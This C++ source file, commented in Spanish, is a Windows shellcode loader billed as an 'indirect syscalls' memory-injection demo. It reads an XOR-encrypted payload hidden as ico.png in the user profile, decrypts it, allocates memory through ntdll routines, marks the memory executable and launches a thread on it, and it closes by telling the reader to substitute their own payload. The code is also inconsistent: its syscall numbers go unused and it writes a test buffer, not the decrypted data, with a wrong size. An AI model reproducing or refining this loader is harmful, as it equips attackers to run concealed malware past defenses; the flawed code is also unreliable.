#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <fstream>
#include <VersionHelpers.h>

using namespace std;

// ==================== PROTOTIPOS DE FUNCIONES ====================

// NtAllocateVirtualMemory
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// NtWriteVirtualMemory
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

// NtProtectVirtualMemory
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

// NtCreateThreadEx
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

// ==================== NÚMEROS DE SYSCALL POR VERSION ====================

// Estructura para almacenar syscall numbers por versión de Windows
struct SyscallNumbers {
    DWORD ntAllocateVirtualMemory;
    DWORD ntWriteVirtualMemory;
    DWORD ntProtectVirtualMemory;
    DWORD ntCreateThreadEx;
};

// Función para obtener la versión de Windows
DWORD GetWindowsVersion() {
    OSVERSIONINFOEXW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    DWORD majorVersion = 0, minorVersion = 0, buildNumber = 0;

    if (IsWindows10OrGreater()) {
        majorVersion = 10;
        minorVersion = 0;
        // Obtener el número de compilación real
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            buildNumber = osvi.dwBuildNumber;
        }
    }
    else if (IsWindows8Point1OrGreater()) {
        majorVersion = 6;
        minorVersion = 3;
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            buildNumber = osvi.dwBuildNumber;
        }
    }
    else if (IsWindows8OrGreater()) {
        majorVersion = 6;
        minorVersion = 2;
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            buildNumber = osvi.dwBuildNumber;
        }
    }
    else if (IsWindows7OrGreater()) {
        majorVersion = 6;
        minorVersion = 1;
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            buildNumber = osvi.dwBuildNumber;
        }
    }
    else {
        // Fallback para versiones no soportadas
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            majorVersion = osvi.dwMajorVersion;
            minorVersion = osvi.dwMinorVersion;
            buildNumber = osvi.dwBuildNumber;
        }
    }

    // Combinar en un solo número para fácil comparación
    return (majorVersion << 24) | (minorVersion << 16) | buildNumber;
}

// Función para obtener los números de syscall según la versión de Windows
SyscallNumbers GetSyscallNumbers() {
    DWORD version = GetWindowsVersion();
    SyscallNumbers numbers = { 0 };

    cout << "Detectando version de Windows..." << endl;

    // Windows 10 versiones diferentes
    if ((version & 0xFF000000) == 0x0A000000) { // Windows 10/11
        DWORD buildNumber = version & 0xFFFF;

        if (buildNumber >= 22000) {
            // Windows 11
            cout << "Windows 11 detectado (Build: " << buildNumber << ")" << endl;
            numbers.ntAllocateVirtualMemory = 0x18;
            numbers.ntWriteVirtualMemory = 0x3A;
            numbers.ntProtectVirtualMemory = 0x50;
            numbers.ntCreateThreadEx = 0xC1;
        }
        else if (buildNumber >= 19041) {
            // Windows 10 20H1+
            cout << "Windows 10 20H1+ detectado (Build: " << buildNumber << ")" << endl;
            numbers.ntAllocateVirtualMemory = 0x18;
            numbers.ntWriteVirtualMemory = 0x3A;
            numbers.ntProtectVirtualMemory = 0x50;
            numbers.ntCreateThreadEx = 0xC1;
        }
        else if (buildNumber >= 18362) {
            // Windows 10 1903
            cout << "Windows 10 1903 detectado (Build: " << buildNumber << ")" << endl;
            numbers.ntAllocateVirtualMemory = 0x18;
            numbers.ntWriteVirtualMemory = 0x3A;
            numbers.ntProtectVirtualMemory = 0x50;
            numbers.ntCreateThreadEx = 0xC0;
        }
        else if (buildNumber >= 17763) {
            // Windows 10 1809
            cout << "Windows 10 1809 detectado (Build: " << buildNumber << ")" << endl;
            numbers.ntAllocateVirtualMemory = 0x18;
            numbers.ntWriteVirtualMemory = 0x3A;
            numbers.ntProtectVirtualMemory = 0x50;
            numbers.ntCreateThreadEx = 0xBF;
        }
        else {
            // Windows 10 versiones anteriores
            cout << "Windows 10 anterior detectado (Build: " << buildNumber << ")" << endl;
            numbers.ntAllocateVirtualMemory = 0x18;
            numbers.ntWriteVirtualMemory = 0x37;
            numbers.ntProtectVirtualMemory = 0x4D;
            numbers.ntCreateThreadEx = 0xB7;
        }
    }
    // Windows 8.1
    else if ((version & 0xFF000000) == 0x06000000 && (version & 0x00FF0000) == 0x00030000) {
        cout << "Windows 8.1 detectado" << endl;
        numbers.ntAllocateVirtualMemory = 0x17;
        numbers.ntWriteVirtualMemory = 0x35;
        numbers.ntProtectVirtualMemory = 0x4B;
        numbers.ntCreateThreadEx = 0xA5;
    }
    // Windows 8
    else if ((version & 0xFF000000) == 0x06000000 && (version & 0x00FF0000) == 0x00020000) {
        cout << "Windows 8 detectado" << endl;
        numbers.ntAllocateVirtualMemory = 0x17;
        numbers.ntWriteVirtualMemory = 0x35;
        numbers.ntProtectVirtualMemory = 0x4B;
        numbers.ntCreateThreadEx = 0xA3;
    }
    // Windows 7
    else if ((version & 0xFF000000) == 0x06000000 && (version & 0x00FF0000) == 0x00010000) {
        cout << "Windows 7 detectado" << endl;
        numbers.ntAllocateVirtualMemory = 0x15;
        numbers.ntWriteVirtualMemory = 0x37;
        numbers.ntProtectVirtualMemory = 0x4D;
        numbers.ntCreateThreadEx = 0xA5;
    }
    else {
        cout << "Version de Windows no soportada o no reconocida" << endl;
        cout << "Usando valores por defecto (puede fallar)" << endl;
        numbers.ntAllocateVirtualMemory = 0x18;
        numbers.ntWriteVirtualMemory = 0x3A;
        numbers.ntProtectVirtualMemory = 0x50;
        numbers.ntCreateThreadEx = 0xC1;
    }

    return numbers;
}

// ==================== OBTENER DIRECCIONES DE FUNCIONES ====================

PVOID GetNtAllocateVirtualMemoryAddress() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        cerr << "Error: No se pudo obtener handle de ntdll.dll" << endl;
        return nullptr;
    }
    return GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
}

PVOID GetNtWriteVirtualMemoryAddress() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        cerr << "Error: No se pudo obtener handle de ntdll.dll" << endl;
        return nullptr;
    }
    return GetProcAddress(hNtdll, "NtWriteVirtualMemory");
}

PVOID GetNtProtectVirtualMemoryAddress() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        cerr << "Error: No se pudo obtener handle de ntdll.dll" << endl;
        return nullptr;
    }
    return GetProcAddress(hNtdll, "NtProtectVirtualMemory");
}

PVOID GetNtCreateThreadExAddress() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        cerr << "Error: No se pudo obtener handle de ntdll.dll" << endl;
        return nullptr;
    }
    return GetProcAddress(hNtdll, "NtCreateThreadEx");
}

// ==================== FUNCIONES PARA INDIRECT SYSCALLS ====================

NTSTATUS IndirectNtAllocateVirtualMemory(
    PVOID pFunctionAddr,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)pFunctionAddr;
    return NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS IndirectNtWriteVirtualMemory(
    PVOID pFunctionAddr,
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
) {

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)pFunctionAddr;
    return NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
}

NTSTATUS IndirectNtProtectVirtualMemory(
    PVOID pFunctionAddr,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {

    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)pFunctionAddr;
    return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS IndirectNtCreateThreadEx(
    PVOID pFunctionAddr,
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)pFunctionAddr;
    return NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

// ==================== SHELLCODE DE PRUEBA ====================
const std::string XOR_KEY = "ClaveSecretaMuyLarga123!";

void xor_func(vector<char>& data, const string& key) {
    if (key.empty()) return;

    size_t key_len = key.length();

    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key_len];
    }
}

// Simple shellcode que ejecuta un MessageBox (x64)
unsigned char testShellcode[] = {
    // MessageBox shellcode (simplificado para demostración)
    0x48, 0x31, 0xC9,                   // xor rcx, rcx
    0x48, 0x31, 0xD2,                   // xor rdx, rdx  
    0x6A, 0x00,                         // push 0
    0x41, 0xB8, 0x48, 0x65, 0x6C, 0x6C, // mov r8d, 'lleH'
    0x41, 0x50,                         // push r8
    0x48, 0x89, 0xE2,                   // mov rdx, rsp
    0x6A, 0x00,                         // push 0
    0x41, 0xB8, 0x54, 0x65, 0x73, 0x74, // mov r8d, 'tseT'
    0x41, 0x50,                         // push r8
    0x49, 0x89, 0xE0,                   // mov r8, rsp
    0x48, 0x31, 0xC9,                   // xor rcx, rcx
    0xC3                                // ret (terminar para evitar crash)
};

// ==================== FUNCIÓN PRINCIPAL ====================

int main() {
    cout << "=== Indirect Syscalls - Secuencia de Inyeccion de Memoria ===" << endl;

    // Obtener números de syscall para esta versión de Windows
    SyscallNumbers syscalls = GetSyscallNumbers();
    cout << "\nNumeros de syscall detectados:" << endl;
    cout << "NtAllocateVirtualMemory: 0x" << hex << syscalls.ntAllocateVirtualMemory << endl;
    cout << "NtWriteVirtualMemory: 0x" << hex << syscalls.ntWriteVirtualMemory << endl;
    cout << "NtProtectVirtualMemory: 0x" << hex << syscalls.ntProtectVirtualMemory << endl;
    cout << "NtCreateThreadEx: 0x" << hex << syscalls.ntCreateThreadEx << endl;

    // Obtener direcciones de las funciones en ntdll.dll
    cout << "\nObteniendo direcciones de funciones..." << endl;
    PVOID pNtAllocateVirtualMemory = GetNtAllocateVirtualMemoryAddress();
    PVOID pNtWriteVirtualMemory = GetNtWriteVirtualMemoryAddress();
    PVOID pNtProtectVirtualMemory = GetNtProtectVirtualMemoryAddress();
    PVOID pNtCreateThreadEx = GetNtCreateThreadExAddress();

    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtProtectVirtualMemory || !pNtCreateThreadEx) {
        cerr << "Error: No se pudieron obtener todas las direcciones de funciones" << endl;
        return 1;
    }

    cout << "NtAllocateVirtualMemory: 0x" << hex << pNtAllocateVirtualMemory << endl;
    cout << "NtWriteVirtualMemory: 0x" << hex << pNtWriteVirtualMemory << endl;
    cout << "NtProtectVirtualMemory: 0x" << hex << pNtProtectVirtualMemory << endl;
    cout << "NtCreateThreadEx: 0x" << hex << pNtCreateThreadEx << endl;

    // Proceso actual para la demostración
    HANDLE hProcess = GetCurrentProcess();

    const DWORD MAX_PATH_SIZE = 256;
    char user_profile_path[MAX_PATH_SIZE];
    DWORD result = GetEnvironmentVariableA("USERPROFILE", user_profile_path, MAX_PATH_SIZE);
    string full_path = string(user_profile_path) + "\\ico.png";

    vector<char> encrypted_data;

    cout << "Intentando abrir el archivo cifrado en: " << full_path << endl;
    ifstream input_file(full_path, ios::binary | ios::in);

    input_file.seekg(0, ios::end);
    size_t file_size = input_file.tellg();
    input_file.seekg(0, ios::beg);

    encrypted_data.resize(file_size);

    input_file.read(encrypted_data.data(), file_size);
    input_file.close();

    xor_func(encrypted_data, XOR_KEY);

    SIZE_T shellcodeSize = sizeof(encrypted_data);

    cout << "\n=== INICIANDO SECUENCIA DE INDIRECT SYSCALLS ===" << endl;

    // PASO 1: NtAllocateVirtualMemory
    cout << "\n1. Ejecutando NtAllocateVirtualMemory..." << endl;
    PVOID allocatedMemory = nullptr;
    SIZE_T regionSize = shellcodeSize;

    NTSTATUS status = IndirectNtAllocateVirtualMemory(
        pNtAllocateVirtualMemory,
        hProcess,
        &allocatedMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        cerr << "Error en NtAllocateVirtualMemory. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }

    cout << "   Memoria asignada en: 0x" << hex << allocatedMemory << endl;
    cout << "   Tamaño de region: " << dec << regionSize << " bytes" << endl;

    // PASO 2: NtWriteVirtualMemory
    cout << "\n2. Ejecutando NtWriteVirtualMemory..." << endl;
    SIZE_T bytesWritten = 0;

    status = IndirectNtWriteVirtualMemory(
        pNtWriteVirtualMemory,
        hProcess,
        allocatedMemory,
        testShellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (!NT_SUCCESS(status)) {
        cerr << "Error en NtWriteVirtualMemory. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }

    cout << "   Bytes escritos: " << dec << bytesWritten << endl;

    // PASO 3: NtProtectVirtualMemory
    cout << "\n3. Ejecutando NtProtectVirtualMemory..." << endl;
    PVOID protectAddress = allocatedMemory;
    SIZE_T protectSize = shellcodeSize;
    ULONG oldProtect = 0;

    status = IndirectNtProtectVirtualMemory(
        pNtProtectVirtualMemory,
        hProcess,
        &protectAddress,
        &protectSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (!NT_SUCCESS(status)) {
        cerr << "Error en NtProtectVirtualMemory. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }

    cout << "   Permisos cambiados exitosamente" << endl;
    cout << "   Proteccion anterior: 0x" << hex << oldProtect << endl;

    // PASO 4: NtCreateThreadEx
    cout << "\n4. Ejecutando NtCreateThreadEx..." << endl;
    HANDLE hThread = nullptr;

    status = IndirectNtCreateThreadEx(
        pNtCreateThreadEx,
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        allocatedMemory,
        nullptr,
        0,
        0,
        0,
        0,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        cerr << "Error en NtCreateThreadEx. NTSTATUS: 0x" << hex << status << endl;
        return 1;
    }

    cout << "   Thread creado exitosamente!" << endl;
    cout << "   Handle del thread: 0x" << hex << hThread << endl;

    cout << "\n=== SECUENCIA COMPLETADA EXITOSAMENTE ===" << endl;
    cout << "\nNOTA: El shellcode de prueba es basico y puede no ejecutar acciones visibles." << endl;
    cout << "En un escenario real, reemplazarias 'testShellcode' con tu payload." << endl;

    // Esperar un poco y limpiar
    cout << "\nEsperando 3 segundos..." << endl;
    Sleep(3000);

    if (hThread) {
        CloseHandle(hThread);
    }

    cout << "Programa finalizado." << endl;
    return 0;
}